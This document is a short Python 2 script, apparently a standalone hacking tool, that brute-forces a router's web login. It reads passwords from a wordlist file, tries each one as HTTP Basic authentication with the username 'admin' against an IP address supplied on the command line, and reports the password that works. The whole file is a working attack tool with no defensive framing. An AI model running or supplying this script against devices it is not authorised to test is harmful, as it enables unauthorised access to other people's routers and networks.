#!/usr/bin/env python
#Author MaYaSeVeN

import urllib2, base64, sys

def brute(ipRouter):
    try:
        wordlist = open("wordlist.txt", 'rU')
        for line in wordlist:
            password = line[0:-1]
            request = urllib2.Request("http://" + ipRouter)
            base64string = base64.encodestring('%s:%s' % ("admin", password))
            request.add_header("Authorization", "Basic %s" % base64string)  
            try:
                urllib2.urlopen(request).read()
                print "\n[+]Sucess!! found " + ipRouter + " password is %s" % password
                break
            except:
                print "[-] " + password
        wordlist.close()
    except IOError:
        print "File \"wordlist.txt\" not found"

if __name__ == '__main__':
    if len(sys.argv) == 2:
        ipRouter = sys.argv[1]  
        brute(ipRouter)
    else: print "Usage : " + sys.argv[0] + " [ip router]"
